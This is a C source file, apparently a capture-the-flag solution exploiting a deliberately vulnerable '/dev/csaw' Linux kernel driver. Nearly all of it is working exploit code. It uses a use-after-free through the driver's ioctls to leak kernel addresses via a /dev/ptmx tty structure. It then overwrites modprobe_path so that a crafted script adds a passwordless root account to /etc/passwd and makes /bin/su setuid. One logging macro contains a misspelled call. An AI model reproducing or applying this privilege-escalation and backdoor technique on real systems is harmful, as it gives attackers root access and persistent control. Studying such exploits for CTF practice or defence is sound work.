#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#define PAGE_SIZE 0x1000

#define logOK(msg, ...)     fprintf(stderr,"[+] " msg "\n", ##__VA_ARGS__)

#define logInfo(msg, ...)   fprintf(stderr,"[*] " msg "\n", ##__VA_ARGS__)

#define logWarn(msg, ...)   fpritnf(stderr,"[!] " msg "\n", ##__VA_ARGS__)

#define logErr(msg, ...)    fprintf(stderr,"[-] " msg "\n", ##__VA_ARGS__)

#define errExit(msg, ...)   do{ fprintf(stderr,"[-] " msg ": " , ##__VA_ARGS__) ; perror("") ; exit(-1) ; }while(0)

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_HANDLE   CSAW_IOCTL_BASE+1
#define CSAW_READ_HANDLE    CSAW_IOCTL_BASE+2
#define CSAW_WRITE_HANDLE   CSAW_IOCTL_BASE+3
#define CSAW_GET_CONSUMER   CSAW_IOCTL_BASE+4
#define CSAW_SET_CONSUMER   CSAW_IOCTL_BASE+5
#define CSAW_FREE_HANDLE    CSAW_IOCTL_BASE+6
#define CSAW_GET_STATS	    CSAW_IOCTL_BASE+7

#define MAX_CONSUMERS 255

struct list_head {
	struct list_head *next, *prev;
};

struct csaw_buf {
    unsigned long consumers[MAX_CONSUMERS];
    char *buf;
    unsigned long size;
    unsigned long seed;
    struct list_head list;
};

LIST_HEAD(csaw_bufs);

struct alloc_args {
    unsigned long size;
    unsigned long handle;
};

struct free_args {
    unsigned long handle;
};

struct read_args {
    unsigned long handle;
    unsigned long size;
    void *out;
};

struct write_args {
    unsigned long handle;
    unsigned long size;
    void *in;
};

struct consumer_args {
    unsigned long handle;
    unsigned long pid;
    unsigned char offset;
};

struct csaw_stats {
    unsigned long clients;
    unsigned long handles;
    unsigned long bytes_read;
    unsigned long bytes_written;
    char version[40];
};


#define devfile "/dev/csaw"

int devfd;

void opendev(){
    devfd = open(devfile,O_RDONLY);
    if(devfd < 0){
        logErr("Open "devfile);
        exit(-1);
    }
}


int alloc_handle(struct alloc_args* arg){
    return ioctl(devfd,CSAW_ALLOC_HANDLE,arg);
}

int read_handle(struct read_args* arg){
    return ioctl(devfd,CSAW_READ_HANDLE,arg);
}

int write_handle(struct write_args* arg){
    return ioctl(devfd,CSAW_WRITE_HANDLE,arg);
}

int get_consumer(struct consumer_args* arg){
    return ioctl(devfd,CSAW_GET_CONSUMER,arg);
}

int set_consumer(struct consumer_args* arg){
    return ioctl(devfd,CSAW_SET_CONSUMER,arg);
}

int free_handle(struct free_args* arg){
    return ioctl(devfd,CSAW_FREE_HANDLE,arg);
}

int get_stats(struct csaw_stats* arg){
    return ioctl(devfd,CSAW_GET_STATS,arg);
}

uint64_t _text;
uint64_t modprobe_path;

void get_root(const char* inject){
    int vjpfd = open(inject,O_CREAT | O_RDWR);
    if(vjpfd < 0)
        errExit("open %s",inject);
    dprintf(vjpfd,
        "#!/bin/sh\n"
        "echo 'vjp::0:0:root:/:/bin/sh' >> /etc/passwd\n"
        "/bin/chmod +s /bin/su"
    );
    close(vjpfd);
    if(chmod(inject,0777))
        errExit("chmod");

    //Trigger call call_modprobe
    int magic = open("/home/ctf/pwn",O_CREAT | O_RDWR);
    if(magic < 0)
        errExit("open /home/ctf/pwn");
    dprintf(magic,"\x13\x37\x42\x42");
    close(magic);
    if(chmod("/home/ctf/pwn",0777))
        errExit("chmod");

    //Root
    system("/home/ctf/pwn");
    system("cat /etc/passwd");
    system("su vjp");
}

int main(int argc,char** argv,char** envp){
    
    opendev();

    struct alloc_args* arg1 = malloc(sizeof(struct alloc_args));

    struct alloc_args* arg2 = malloc(sizeof(struct alloc_args));

    arg1->size = 0x2e0;
    arg2->size = 0x2e0;

    if(alloc_handle(arg1)){
        errExit("alloc_handle(arg1)");
    }

    if(alloc_handle(arg2)){
        errExit("alloc_handle(arg2)");
    }

    struct consumer_args consumer_args = {
        .handle = arg1->handle,
        .offset = 0xff,   
    };

    if(get_consumer(&consumer_args)){
        errExit("get_consumer(&consumer_args)");
    }

    logOK("csaw_buf1->buf = %p", (void *)consumer_args.pid);

    uint64_t buf1 = consumer_args.pid;

    struct free_args* free1 = malloc(sizeof(struct free_args));
    free1->handle = arg1->handle;

    if(free_handle(free1)){
        errExit("free_handle(free1)");
    }

    int ptmx_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if(ptmx_fd < 0){
        errExit("Can't open /dev/ptmx");
    }

    consumer_args.handle = arg2->handle;
    consumer_args.offset = 0xff;

    
    if(get_consumer(&consumer_args)){
        errExit("set_consumer(&consumer_args)");
    }

    uint64_t seek2 = consumer_args.pid ^ arg2->handle;

    logOK("seek2 = 0x%lx", seek2);

    consumer_args.handle = arg2->handle;
    consumer_args.offset = 0xff;
    consumer_args.pid    = buf1;

    if(set_consumer(&consumer_args)){
        errExit("set_consumer(&consumer_args)");
    }

    arg2->handle = buf1 ^ seek2;

    struct read_args* leak = malloc(sizeof(struct read_args));

    leak->handle = arg2->handle;
    leak->size = 0x2e0;
    leak->out  = calloc(1,0x2e0);

    if(read_handle(leak)){
        errExit("read_handle(leak)");
    }

    uint64_t ptm_unix98_ops = *(uint64_t *)(leak->out+0x18);

    _text = ptm_unix98_ops - 0x1281540;
    modprobe_path = ptm_unix98_ops + 0x8be640;

    logOK("ptm_unix98_ops = 0x%lx",ptm_unix98_ops);
    logOK("modprobe_path = 0x%lx",modprobe_path);

    consumer_args.handle = arg2->handle;
    consumer_args.offset = 0xff;
    consumer_args.pid    = modprobe_path;

    if(set_consumer(&consumer_args)){
        errExit("set_consumer(&consumer_args)");
    }

    arg2->handle = modprobe_path ^ seek2;

    free(arg1); 
    free(leak);

    struct write_args* overwrite = malloc(sizeof(struct write_args));

    overwrite->handle = arg2->handle;
    overwrite->in = "/home/ctf/vjp";
    overwrite->size = strlen(overwrite->in) + 1;

    if(write_handle(overwrite)){
        errExit("write_handle(overwrite)");
    }

    get_root(overwrite->in);

    getchar();

}